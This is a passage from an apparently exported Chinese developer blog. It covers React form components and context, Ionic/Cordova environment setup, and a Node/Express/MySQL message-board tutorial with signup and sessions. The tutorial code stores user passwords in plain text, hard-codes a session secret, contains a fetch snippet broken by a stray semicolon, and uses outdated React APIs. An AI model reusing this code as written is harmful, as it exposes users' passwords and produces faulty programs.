&#125; from 'react';export default class ControlForm extends Component &#123; state=&#123; userInput: '' &#125; constructor(props) &#123; super(props); //this.state=&#123; userInput: '' &#125;; &#125; handleChange(e) &#123; // 1、在react中思想是每一个组件的状态都应该为组件本身所控制 // 2、受控表单组件中的value值是要和state属性绑定的，受控表单组件只能通过onChange方法去改变state的值，从而触发页面的从新渲染绑定 // 3、扩展：WebComponent &lt;x-search&gt; // 方法一：用refs获取属性值 console.log(this.refs.theInput1.value); let inputStr=""; if(e.target.value.length&gt;=16)&#123; inputStr=e.target.value.slice(0,15)+"..."; &#125;else&#123; inputStr=e.target.value; &#125; // 方法二：用事件参数获取属性值 this.setState(&#123; userInput:inputStr&#125;); &#125; clearAndFocusInput() &#123; // 第一个参数是要重新赋值的state，第二个参数一个回调函数 this.setState(&#123; userInput: '' &#125;, () =&gt; &#123; this.refs.theInput.focus(); &#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;div onClick=&#123;this.clearAndFocusInput.bind(this)&#125;&gt; Click to Focus and Reset &lt;/div&gt; &#123;/*受控表单组件改变输入框的写法*/&#125; &lt;input ref="theInput1" value=&#123;this.state.userInput&#125; onChange=&#123;this.handleChange.bind(this)&#125; /&gt; &lt;br/&gt; &#123;/*受控表单组件写死了value值，永远不会改变了*/&#125; &lt;input ref="theInput" value='I'am mhq' /&gt; &lt;br/&gt; &#123;/*非受控表单组件它里面输入框值的改变不被react控制*/&#125; &lt;input ref="theInput" /&gt; &lt;/div&gt; ); &#125;&#125; 非受控属性和受控组件相对，如果表单元素没有设置自己的“状态属性”，或者属性值设置为 null，这时候就是非受控组件。它的表现就符合普通的表单元素，正常响应用户的操作。同样，你也可以绑定 onChange 事件处理交互。如果你想要给“状态属性”设置默认值，就要用 React 提供的特殊属性 defaultValue，对于 checked 会有 defaultChecked，也是使用 defaultValue。 为什么要有受控组件引入受控组件不是说它有什么好处，而是因为 React 的 UI 渲染机制，对于表单元素不得不引入这一特殊的处理方式。 在浏览器 DOM 里面是有区分 attribute 和 property 的。 attribute 是在 HTML 里指定的属性，而每个 HTML 元素在 JS 对应是一个 DOM 节点对象，这个对象拥有的属性就是 property（可以在 console 里展开一个 DOM 节点对象看一下，HTML attributes 只是对应其中的一部分属性），attribute 对应的 property 会从 attribute 拿到初始值，有些会有相同的名称，但是有些名称会不一样，比如 attribute class 对应的 property 就是 className。（详细解释：.prop，.prop() vs .attr()）。回到 React 里的 &lt;input&gt; 输入框，当用户输入内容的时候，输入框的 value property 会改变，但是 value attribute 依然会是 HTML 上指定的值（attribute 要用 setAttribute 去更改）。 React 组件必须呈现这个组件的状态视图，这个视图 HTML 是由 render 生成，所以对于： 123render: function() &#123; return &lt;input type="text" value="hello"/&gt;;&#125; 在任意时刻，这个视图总是返回一个显示 hello 的输入框。 处理 select 表单在 HTML 中 &lt;select&gt; 标签指定选中项都是通过对应 &lt;option&gt; 的 selected 属性来做的，但是在 React 修改成统一使用 value。所以没有一个 selected 的状态属性。 12345&lt;select value="B"&gt; &lt;option value="A"&gt;Apple&lt;/option&gt; &lt;option value="B"&gt;Banana&lt;/option&gt; &lt;option value="C"&gt;Cranberry&lt;/option&gt;&lt;/select&gt; 可以通过传递一个数组指定多个选中项：&lt;select multiple={true} value={[&#39;B&#39;, &#39;C&#39;]}&gt; 参数传递的判断http://facebook.github.io/react/docs/transferring-props.html 组合组件使用组件的目的就是通过构建模块化的组件，相互组合组件最后组装成一个复杂的应用。 在 React 组件中要包含其他组件作为子组件，只需要把组件当作一个 DOM 元素引入就可以了。 http://reactjs.cn/react/docs/multiple-components.html 循环插入子元素如果组件中包含通过循环插入的子元素，为了保证重新渲染 UI 的时候能够正确显示这些子元素，每个元素都需要通过一个特殊的 key 属性指定一个唯一值。为了内部 diff 的效率。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//Todolistdemoimport React, &#123;Component&#125; from 'react';// 循环生成列表组件class TodoList extends Component&#123; render() &#123; let createItem = function(item) &#123; return &lt;li key=&#123;item.id&#125;&gt;&#123;item.text&#125;&lt;/li&gt;; &#125;; return &lt;ul&gt;&#123;this.props.items.map(createItem)&#125;&lt;/ul&gt;; &#125;&#125;//var Item = React.createClass(&#123;// render: function() &#123;// return &lt;li key=&#123;item.id&#125; onClick=&#123;this.props.deleteItem&#125;&gt;&#123;item.text&#125;&lt;/li&gt;;// &#125;//&#125;);class TodoApp extends Component&#123; constructor(props)&#123; super(props); // 初始化了我们的state，这是被推荐的写法 this.state = &#123; items: [],// 存我们输入的数据 text: '' // 每次输入文本 &#125;; &#125; // 输入框change事件 onChange=(e)=&gt; &#123; this.setState(&#123;text: e.target.value&#125;); &#125; handleSubmit=(e)=&gt; &#123; e.preventDefault(); let nextItems = this.state.items.concat([&#123;text: this.state.text, id: Date.now()&#125;]); let nextText = ''; this.setState(&#123;items: nextItems, text: nextText&#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h3&gt;TODO&lt;/h3&gt; &lt;TodoList items=&#123;this.state.items&#125;/&gt; &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;input onChange=&#123;this.onChange&#125; value=&#123;this.state.text&#125; /&gt; &lt;button&gt;&#123;'Add #' + (this.state.items.length + 0)&#125;&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; ); &#125;&#125;export default TodoApp;//moudle.exports=TodoApp; （1）当 React 校正带有 key 的子级时，它会确保它们被重新排序（而不是破坏）或者删除（而不是重用）。 务必 把 key 添加到子级数组里组件本身上，而不是每个子级内部最外层 HTML 上。 （2）也可以传递 object 来做有 key 的子级。object 的 key 会被当作每个组件的 key。但是一定要牢记 JavaScript 并不总是保证属性的顺序会被保留。实际情况下浏览器一般会保留属性的顺序，除了 使用 32位无符号数字做为 key 的属性。数字型属性会按大小排序并且排在其它属性前面。一旦发生这种情况，React 渲染组件的顺序就是混乱。可能在 key 前面加一个字符串前缀来避免： 1234567891011121314render: function() &#123; var items = &#123;&#125;; this.props.results.forEach(function(result) &#123; // 如果 result.id 看起来是一个数字（比如短哈希），那么 // 对象字面量的顺序就得不到保证。这种情况下，需要添加前缀 // 来确保 key 是字符串。 items['result-' + result.id] = &lt;li&gt;&#123;result.text&#125;&lt;/li&gt;; &#125;); return ( &lt;ol&gt; &#123;items&#125; &lt;/ol&gt; ); &#125; 子级组件标签里面包含的子元素会通过父元素的props.children 传递进来。 HTML 元素会作为 React 组件对象、JS 表达式结果是一个文字节点，都会存入 Parent 组件的 props.children。 props.children 通常是一个组件对象的数组，但是当只有一个子元素的时候，props.children 将是这个唯一的子元素，而不是数组了. 1234567891011121314151617181920var NotesList = React.createClass(&#123; render: function() &#123; return ( &lt;ol&gt; &#123; React.Children.map(this.props.children, function (child) &#123; return &lt;li&gt;&#123;child&#125;&lt;/li&gt;; &#125;) &#125; &lt;/ol&gt; ); &#125;&#125;);ReactDOM.render( &lt;NotesList&gt; &lt;span&gt;hello&lt;/span&gt; &lt;span&gt;world&lt;/span&gt; &lt;/NotesList&gt;, document.body); 上面代码的 NoteList 组件有两个 span 子节点，它们都可以通过 this.props.children 读取。 这里需要注意， this.props.children 的值有三种可能：如果当前组件没有子节点，它就是 undefined ;如果有一个子节点，数据类型是 object ；如果有多个子节点，数据类型就是 array 。所以，处理 this.props.children 的时候要小心。React 提供一个工具方法 React.Children 来处理 this.props.children 。我们可以用 React.Children.map 来遍历子节点，而不用担心 this.props.children 的数据类型是 undefined 还是 object。更多的 React.Children 的方法，请参考官方文档。 propsTypehttp://www.reactjs.cn/react/docs/reusable-components.html 做属性校验使用： 12345678910111213141516171819202122232425262728293031323334// react中的属性校验import React, &#123; Component &#125; from 'react';export default class PropsCheck extends Component &#123; // 初始化props属性 //static defaultProps=&#123; // autoPlay:false, // maxLoops:10, //&#125;; constructor(props) &#123; super(props); //this.state=&#123; userInput: '' &#125;; &#125; // 进行属性校验 static propTypes = &#123; autoPlay: React.PropTypes.bool.isRequired, maxLoops: React.PropTypes.number.isRequired, &#125;; render() &#123; return ( &lt;div&gt; 属性校验 &lt;/div&gt; ); &#125;&#125;//写在外面的写法//MyInputFocus.defaultProps=&#123;// autoPlay:false,// maxLoops:10,//&#125;//MyInputFocus.propTypes = &#123;// autoPlay: React.PropTypes.bool.isRequired,// maxLoops: React.PropTypes.number.isRequired,//&#125; Contexthttp://facebook.github.io/react/docs/context.html 子组件使用父组件的值，通过 context 可以隔代获取值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import React, &#123;Component&#125; from 'react';var Button = React.createClass(&#123; // 在孙子里面校验祖宗里面的属性 contextTypes: &#123; color: React.PropTypes.string &#125;, render: function() &#123; return ( &lt;div&gt; &lt;h1&gt;&#123;this.context.age&#125;&lt;/h1&gt; &lt;button style=&#123;&#123;background: this.context.color&#125;&#125;&gt; &#123;this.props.children&#125; &lt;/button&gt; &lt;/div&gt; ); &#125;&#125;);var Message = React.createClass(&#123; render: function() &#123; return ( &lt;div&gt; &#123;this.props.text&#125; &lt;Button&gt;Delete&lt;/Button&gt; &lt;/div&gt; ); &#125;&#125;);var MessageList = React.createClass(&#123; // 通过这个方法去传递属性 getChildContext: function() &#123; return &#123; color: "red", age:12 &#125;; &#125;, // 传递给子孙属性的类型校验 childContextTypes: &#123; color: React.PropTypes.string, age: React.PropTypes.number &#125;, render: function() &#123; var children = this.props.messages.map(function(message) &#123; return &lt;Message text=&#123;message.text&#125; /&gt;; &#125;); return &lt;div&gt;&#123;children&#125;&lt;/div&gt;; &#125;&#125;);export default MessageList; 动画http://facebook.github.io/react/docs/animation.htmlhttp://blog.csdn.net/lihongxun945/article/details/46778723https://zhuanlan.zhihu.com/p/20419592 例子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445// react中的dom监听事件import React, &#123; Component &#125; from 'react';import ReactCSSTransitionGroup from 'react-addons-css-transition-group'import './animate.css'export default class Animate extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;items: ['hello', 'world', 'click', 'me']&#125;; this.handleAdd = this.handleAdd.bind(this); &#125; handleAdd() &#123; const newItems = this.state.items.concat([ prompt('Enter some text') ]); this.setState(&#123;items: newItems&#125;); &#125; handleRemove(i) &#123; let newItems = this.state.items.slice(); newItems.splice(i, 1); this.setState(&#123;items: newItems&#125;); &#125; render() &#123; const items = this.state.items.map((item, i) =&gt; ( &lt;div key=&#123;item&#125; onClick=&#123;() =&gt; this.handleRemove(i)&#125;&gt; &#123;item&#125; &lt;/div&gt; )); return ( &lt;div&gt; &lt;button onClick=&#123;this.handleAdd&#125;&gt;Add Item1&lt;/button&gt; &#123;/*这个组件虽然叫动画，但是它只负责显示隐藏的动画*/&#125; &#123;/*你想让谁有显示隐藏的动画你就用ReactCSSTransitionGroup包裹谁*/&#125; &#123;/*后添加进去的元素和删除的元素才有动画效果，同时添加元素和ReactCSSTransitionGroup是没有动画效果的*/&#125; &lt;ReactCSSTransitionGroup component="div" transitionName="example" transitionAppear=&#123;true&#125; transitionEnterTimeout=&#123;500&#125; transitionLeaveTimeout=&#123;300&#125;&gt; &#123;items&#125; &lt;/ReactCSSTransitionGroup&gt; &lt;/div&gt; ); &#125;&#125; 获取react常用插件的网址https://js.coach/react/react-infinitehttps://react.parts/native diff算法http://blog.csdn.net/lihongxun945/article/details/46640503http://reactjs.cn/react/docs/reconciliation.htmlhttp://blog.csdn.net/yczz/article/details/49585283http://blog.csdn.net/yczz/article/details/49886061 Web Componentshttp://www.oschina.net/p/polymerhttp://facebook.github.io/react/docs/webcomponents.html 服务器渲染http://zhuanlan.zhihu.com/p/20669111?from=groupmessage&amp;isappinstalled=0 组件间通信非父子组件间的通信使用全局事件 Pub/Sub 模式，在 componentDidMount 里面订阅事件，在 componentWillUnmount 里面取消订阅，当收到事件触发的时候调用 setState 更新 UI。 这种模式在复杂的系统里面可能会变得难以维护，所以看个人权衡是否将组件封装到大的组件，甚至整个页面或者应用就封装到一个组件。 一般来说，对于比较复杂的应用，推荐使用类似 Flux 这种单项数据流架构，参见 Data Flow。Flux 和 redux 数据流FluxGithub地址：https://github.com/facebook/flux React redux react-redux react-router webpack+gulp ES6 babelMocha+chai nodeReact native Flex fetch 原生 插件]]></content>
      <categories>
        <category>React系列</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[混合APP开发环境配置-ionic、cordora]]></title>
    <url>%2F2017%2F06%2F20%2F%E6%B7%B7%E5%90%88APP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-ionic%E3%80%81cordora%2F</url>
    <content type="text"><![CDATA[java环境Android ADT需要 1、JDK下载地址： http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 2、配置 Java 的环境变量 JAVA_HOME 和 CLASSPATH JAVA_HOME 是 java 的安装目录的 bin 目录 JAVA_HOME: D:\Program Files\Java\jdk1.8.0_91 CLASSPATH: .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 我自己的配置如下： JAVA_HOME C:\Program Files\Java\jdk1.8.0_112Path: %JAVA_HOME%\jre\bin;%JAVA_HOME%\bin;CLASSPAHT: .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 配置 Java 环境变量的方法 C++ 环境需要 c++ 环境，window 10 已自带，其他系统只需安装 vs2016，把 c++ 环境勾选即可。 Android ADT环境打包android应用的时候需要 1、下载安装ADT所需要的手动安装包 http://www.androiddevtools.cn/ 需要的包的截图 node 环境node 需要使用稳定版本，如果需要管理多个版本，使用 nvm，如果是 windows 系统，那么使用 nvm 的 windows 版本。 nvm 的下载安装地址(windows版)：https://github.com/coreybutler/nvm-windows 在 nvm v1.1.1 版本中，虽然没有完成通过命令行配置镜像的功能（可以使用这两条命令，但无效……不不知作者怎么想的），但可以通过设置文件来配置镜像源。 在 nvm 安装目录中寻找 setting.txt 文件，打开后设置如下两条： node_mirror: https://npm.taobao.org/mirrors/node/npm_mirror: https://npm.taobao.org/mirrors/npm/ nvm install node版本号 安装具体版本的 node nvm use 7.0.0 切换到已安装的具体版本 nvm ls 列出本地已安装的所有的 node 环境版本 如果下载不成功，使用代理服务器下载安装，如: shadowsocks nvm proxy 127.0.0.1:1008，127.0.0.1:1008是代理地址，使用的是服务器下载 nvm install 7.0.0 Git环境ng-cordova 插件需要，源代码管理 git 的下载地址：https://git-scm.com/downloads 下载后直接安装，我这边没有配环境直接可用 cordova ionic1$ npm install -g cordova ionic 3 条命令12345ionic start myApp在 myApp 项目跟目录下执行下面命令ionic platform add androidionic build androidionic run android 执行 ionic platform add android 过程中如果出错，报 error occurred during initialization of vm，安装的是 jdk-8u112-windows-i586_8.0.1120.15.exe 版本，windows 64报错, 配置系统环境变量 –&gt; 新建 –&gt; _JAVA_OPTIONS–&gt; -Xmx512M ， 结果是： 然后又换了 64 位的 jdk，官方网站下载 jdk-8u112-windows-x64.exe 之后因为我一个文件名字 build 写错了没出来，修改了之后就打包成功了。 注：为了避免不必要的麻烦：所有这一过程都在 c 盘执行的。 使用IONIC制作APP最后，来一张总图：]]></content>
      <categories>
        <category>Hybrid APP开发系列</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>ionic</tag>
        <tag>cordova</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-留言列表小项目]]></title>
    <url>%2F2017%2F05%2F18%2FNode-%E7%95%99%E8%A8%80%E5%88%97%E8%A1%A8%E5%B0%8F%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[该项目是仿照某些网站的留言列表做的一些小功能，项目没有划分 M V C，使用的前台技术是 Bootstrap，后台使用的是 Node.js，模板引擎使用的是 EJS，数据库是 MySQL。 依赖 Bootstrap jQuery 使用 jQuery 的 ajax 做异步无刷新列表加载 EJS Node.js express body-parser express 的中间件(middleware)，可以用来解析 post 请求体数据 mysql moment js-cookie 安装依赖1$ npm install bootstrap jquery express art-template --save package.json (包括项目后面流程安装的依赖包)1234567891011121314151617181920212223&#123; &quot;name&quot;: &quot;feedback&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: &#123; &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot; &#125;, &quot;keywords&quot;: [], &quot;author&quot;: &quot;lpz &lt;mail@lipengzhou.com&gt; (http://www.lipengzhou.com/)&quot;, &quot;license&quot;: &quot;MIT&quot;, &quot;dependencies&quot;: &#123; &quot;art-template&quot;: &quot;^3.0.3&quot;, &quot;body-parser&quot;: &quot;^1.15.2&quot;, &quot;bootstrap&quot;: &quot;^3.3.7&quot;, &quot;ejs&quot;: &quot;^2.5.2&quot;, &quot;express&quot;: &quot;^4.14.0&quot;, &quot;jquery&quot;: &quot;^3.1.1&quot;, &quot;js-cookie&quot;: &quot;^2.1.3&quot;, &quot;moment&quot;: &quot;^2.16.0&quot;, &quot;mysql&quot;: &quot;^2.12.0&quot; &#125;&#125; 页面搭建：Bootstrap 最终完整页面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;反馈留言本&lt;/title&gt; &lt;link rel="stylesheet" href="/node_modules/bootstrap/dist/css/bootstrap.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- 页头 --&gt; &lt;div class="container"&gt; &lt;div class="page-header"&gt; &lt;h1&gt;反馈系统&lt;small&gt;留言本&lt;/small&gt;&lt;/h1&gt;欢迎：&lt;%= user.username %&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 页头 --&gt; &lt;!-- 留言列表区域 --&gt; &lt;div class="container"&gt; &lt;ul class="list-group"&gt; &lt;li class="list-group-item list-group-item-info"&gt;留言（&lt;span id="message_count"&gt;&lt;/span&gt;条）&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;!-- /留言列表区域 --&gt; &lt;!-- 留言表单区域 --&gt; &lt;div class="container"&gt; &lt;div class="panel panel-warning"&gt; &lt;div class="panel-heading"&gt; &lt;h3 class="panel-title"&gt;我要发表看法&lt;/h3&gt; &lt;/div&gt; &lt;div class="panel-body"&gt; &lt;!-- 后台指定提交的接口 --&gt; &lt;form id="form" action="/message/add" method="post" role="form"&gt; &lt;div&gt; &lt;label for=""&gt;您的留言&lt;/label&gt; &lt;textarea class="form-control" required name="message" rows="5"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=""&gt;您的大名&lt;/label&gt; &lt;input type="text" class="form-control" required name="name" placeholder="请输入您的大名"&gt; &lt;/div&gt; &lt;div class="form-group"&gt; &lt;label for=""&gt;电子邮件&lt;/label&gt; &lt;input type="email" class="form-control" required name="email" placeholder="请输入您的电子邮件"&gt; &lt;/div&gt; &lt;button type="submit" class="btn btn-success"&gt;发表&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- /留言表单区域 --&gt; &lt;script type="text/template" id="tpl"&gt; &#123;&#123;each messages as message index&#125;&#125; &lt;li class="list-group-item"&gt;&#123;&#123;message.name&#125;&#125;：&#123;&#123;message.message&#125;&#125;&lt;span class="pull-right"&gt;&#123;&#123;message.date&#125;&#125;&lt;/span&gt;&lt;/li&gt; &#123;&#123;/each&#125;&#125; &lt;/script&gt; &lt;script src="/node_modules/art-template/dist/template.js"&gt;&lt;/script&gt; &lt;script src="/node_modules/jquery/dist/jquery.js"&gt;&lt;/script&gt; &lt;script&gt; loadMessages(); function loadMessages() &#123; // ajax 已死， 未来 fetch 可能会成为标准 window.fetch('/message'); .then(res =&gt; &#123; return res.json(); &#125;) .then(data =&gt; &#123; $('.list-group li:gt(0)').remove(); // 前台渲染页面 const result = template('tpl', data); $('#message_count').html(data.messages.length); $('.list-group').append(result); &#125;); &#125; $('#form').on('submit', function (e) &#123; // 加上这句，表单不会默认提交了 e.preventDefault(); $.ajax(&#123; url: $(this).attr('action'), type: $(this).attr('method'), data: $(this).serialize(), dataType: 'json' &#125;) .then(data =&gt; &#123; // 是否成功由后台告诉前台 if (data.code === 1000) &#123; // 成功后清空留言输入框 $('#form [name]').val(''); loadMessages(); window.alert('留言成功'); &#125; &#125;); // 和 e.preventDefault(); 作用相同 // return false; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 数据库设计: feedback 名 类型 长度 小数点 不是null 主键 id int 空 空 yes yes message text 空 空 yes 空 name varchar 50 空 yes 空 email varchar 50 空 yes 空 data datatime 空 空 yes 空 页面入口/后台数据处理 app.js安装依赖： 1$ npm install body-parser moment ejs --save app.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123const express = require('express');const path = require('path');const db = require('./db');const bodyParser = require('body-parser');const moment = require('moment');const app = express();// 公开静态资源app.use('/node_modules', express.static(path.join(__dirname, 'node_modules')));app.use('/public', express.static(path.join(__dirname, 'public'))); // 配置模板引擎// 配置视图存放路径，不配置默认就是 viewsapp.set('views', path.join(__dirname, 'views'));// 默认后缀名是 ejs，这样配置就可以使用 html 后缀名// xTemplate 模板引擎配置也是如此app.engine('.html', require('ejs').__express);app.set('view engine', 'html');// 配置解析普通表单 POST 请求体的中间件// 任何请求进来，如果是 POST 请求，则该中间件会自动解析 POST 请求体// 解析成一个对象，然后挂载给 req 请求对象一个属性：body，然后调用下一个中间件// 也就是说在后续某一个被匹配到的处理函数中可以直接通过 req.body 来使用表单 POST 提交的数据app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 请求网站根路径app.get('/', (req, res) =&gt; &#123; // 渲染首页 res.render('index');&#125;);app.get('/message', (req, res, next) =&gt; &#123; // 1. 查询数据库，获取数据库中的内容 // 2. 可能会处理一下获取到的数据 // 3. 发送响应 db.query('SELECT * FROM `feedback` ORDER BY `date` DESC', (err, rows) =&gt; &#123; // 按日期排序 if (err) &#123; return next(err); &#125; // 处理时间 rows.forEach(r =&gt; r.date = moment(r.date).format('YYYY-MM-DD HH:mm:ss')); res.json(&#123; messages: rows &#125;); &#125;);&#125;);app.get('/signup', (req, res) =&gt; &#123; res.render('signup');&#125;);// 注册请求处理（异步请求表单不会刷新）app.post('/signup', (req, res, next) =&gt; &#123; // 1. 接收请求数据：做数据的合法性校验 // 2. 处理请求：先校验用户名是否被占用、 // 如果已存在，告诉用户，用户名被占用了；如果不存在，执行注册 // 注册成功：告诉用户：操作成功；如果失败，也告诉用户，操作失败 // 3. 发送响应 const body = req.body; // 前端传递给后台的数据，一定要再次做合法性校验 db.query('SELECT * FROM `users` WHERE `username`=?', [body.username], (err, rows) =&gt; &#123; if (err) &#123; return next(err); &#125; if (rows[0]) &#123; // 说明被占用了 return res.json(&#123; // 异步交互返回结果状态码，业务状态码 code: 2001, message: 'username already exists' &#125;); &#125; // 执行到这里，可以插入数据了 db.query('INSERT INTO `users`(`username`, `password`, `email`, `create_time`, `last_signin_time`) VALUES(?, ?, ?, ?, ?)', [ body.username, body.password, body.email, moment().format('YYYY-MM-DD HH:mm:ss'), moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err); &#125; res.json(&#123; code: 2000, message: 'success', &#125;); &#125;); &#125;);&#125;);app.get('/signin', (req, res) =&gt; &#123; res.render('signin');&#125;);// post 处理留言页面异步表单提交，可以不使用 form，但是最好加上；后台会指定需要哪些数据// body &#123; message: '', name: '', email: '' &#125;app.post('/message/add', (req, res, next) =&gt; &#123; // 1. 接收客户端提交的数据 // 2. 处理客户端提交的数据：2.1、对数据做合法性校验；2.2、 校验通过之后，插入数据库 // 3. 给当前请求客户端发送响应 const body = req.body; db.query('INSERT INTO `feedback`(`message`, `name`, `email`, `date`) VALUES(?, ?, ?, ?)', [ body.message, body.name, body.email, moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err); &#125; // 重定向对 ajax 请求没有用，重定向只对客户端同步请求有效 // 例如输入了一个地址敲回车，点了一个 a 连接，提交了一个表单都是同步请求 res.json(&#123; code: 1000, message: 'success' &#125;); &#125;);&#125;);// 千万不要少些最后一个 next// 如果少了最后的参数 next，则现在这个中间件就是处理请求的中间件 req res next// 所以错误处理中间件一定要使用四个参数：err req res next// 只要在之前的任何中间件中调用 next 的时候，传递了参数，就一定会执行下面这个错误处理中间件app.use((err, req, res, next) =&gt; &#123; res.send(`500 ErrorMessage:$&#123;err.message&#125;`);&#125;);// 监听端口，启动服务app.listen(3000, () =&gt; &#123; console.log('server is running at port 3000.');&#125;); 渲染页面 EJS123&#123;&#123;each messages as message index&#125;&#125;&lt;li class="list-group-item"&gt;&#123;&#123;message.name&#125;&#125;：&#123;&#123;message.message&#125;&#125;&lt;span class="pull-right"&gt;&#123;&#123;message.date&#125;&#125;&lt;/span&gt;&lt;/li&gt;&#123;&#123;/each&#125;&#125; 前台 ajax 请求1234567891011121314151617181920$('#form').on('submit', function (e) &#123; // 加上这句，表单不会默认提交了 e.preventDefault(); $.ajax(&#123; url: $(this).attr('action'), type: $(this).attr('method'), data: $(this).serialize(), dataType: 'json' &#125;) .then(data =&gt; &#123; // 是否成功由后台告诉前台 if (data.code === 1000) &#123; $('#form [name]').val(''); loadMessages(); window.alert('留言成功'); &#125; &#125;); // 和 e.preventDefault(); 作用相同 // return false;&#125;); 后台 post 请求处理? express 的 body-parser 中间件 配置中间键： 12app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json()); 日期格式化包： 1$ npm install moment --save 格式化日期方法： 1moment().format(&apos;YYYY-MM-DD HH:mm:ss&apos;) 后台处理 post 请求 1234567891011121314151617app.post('/message/add', (req, res, next) =&gt; &#123; const body = req.body; db.query('INSERT INTO `feedback`(`message`, `name`, `email`, `date`) VALUES(?, ?, ?, ?)', [ body.message, body.name, body.email, moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err); &#125; res.json(&#123; code: 1000, message: 'success' &#125;); &#125;);&#125;); 响应给前台后，前台处理响应成功逻辑： 123456// 是否成功由后台告诉前台if (data.code === 1000) &#123; $('#form [name]').val(''); loadMessages(); window.alert('留言成功');&#125; 注册登录模块登录页面注册页面流程添加表 users 索引 类型 长度 小数点 不是null 主键 id int 50 空 yes yes username varchar 50 空 yes 空 password varchar 50 空 yes 空 email varchar 50 空 yes 空 create_time datetime 空 空 yes 空 last_signin_time datetime 空 空 yes 空 处理注册页面后台逻辑123456789101112131415161718192021222324252627282930313233343536373839// 注册请求处理（异步请求表单不会刷新）app.post('/signup', (req, res, next) =&gt; &#123; // 1. 接收请求数据：做数据的合法性校验 // 2. 处理请求：先校验用户名是否被占用、 // 如果已存在，告诉用户，用户名被占用了；如果不存在，执行注册 // 注册成功：告诉用户：操作成功；如果失败，也告诉用户，操作失败 // 3. 发送响应 const body = req.body; // 前端传递给后台的数据，一定要再次做合法性校验 db.query('SELECT * FROM `users` WHERE `username`=?', [body.username], (err, rows) =&gt; &#123; if (err) &#123; return next(err); &#125; if (rows[0]) &#123; // 说明被占用了 return res.json(&#123; // 异步交互返回结果状态码，业务状态码 code: 2001, message: 'username already exists' &#125;); &#125; // 执行到这里，可以插入数据了 db.query('INSERT INTO `users`(`username`, `password`, `email`, `create_time`, `last_signin_time`) VALUES(?, ?, ?, ?, ?)', [ body.username, body.password, body.email, moment().format('YYYY-MM-DD HH:mm:ss'), moment().format('YYYY-MM-DD HH:mm:ss') ], (err, stat) =&gt; &#123; if (err) &#123; return next(err); &#125; res.json(&#123; code: 2000, message: 'success', &#125;); &#125;); &#125;);&#125;); 处理注册页面前台逻辑123456789101112131415161718$('form').on('submit', function (e) &#123; e.preventDefault(); $.ajax(&#123; url: $(this).attr('action'), type: $(this).attr('method'), data: $(this).serialize(), dataType: 'json' &#125;) .then(data =&gt; &#123; if (data.code === 2000) &#123; window.alert('恭喜：注册成功'); // 可以通过控制 location 的 href ，让浏览器跳转 window.location.href = '/'; &#125; else if (data.code === 2001) &#123; window.alert('用户名已存在，请更换重试'); &#125; &#125;);&#125;); 记住用户名（通过前台来写） 方法一： 安装插件： 1$ npm install js-cookie --save 设置 cookie： 12345678var username = Cookies.get(&apos;username&apos;);if (username) &#123; document.querySelector(&apos;#username&apos;).value = username;&#125;$(&apos;form&apos;).on(&apos;submit&apos;, function (e) &#123; e.preventDefault(); Cookies.set(&apos;username&apos;, $(&apos;#username&apos;).val());&#125;); 在 express 中使用 cookie-parser安装： 1$ npm install cookie-parser --save 配置： 1234const express = require('express');const cookieParser = require('cookie-parser');const app = express();app.use(cookieParser()); 方法二：session 保持状态 session 和 cookie 结合使用。 在 express 中使用 session安装： 1$ npm install express-session --save 配置： 123456789const express = require('express');const session = require('express-session');const app = express();app.use(session(&#123; // 表示生成钥匙的时候根据这个字符串生成 secret: 'mhq', resave: false, saveUnitialized: true&#125;)); 处理用户注册和登录的状态1$ npm install express-session --save 最终的 app.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149// 引入包const express = require('express');const path = require('path');const db = require('./db');const bodyParser = require('body-parser');const moment = require('moment');const session = require('express-session');const app = express();// 暴露静态资源app.use('/node_modules', express.static(path.join(__dirname, 'node_modules')));app.use('/public', express.static(path.join(__dirname, 'public')));// 配置模板引擎app.set('views', path.join(__dirname, 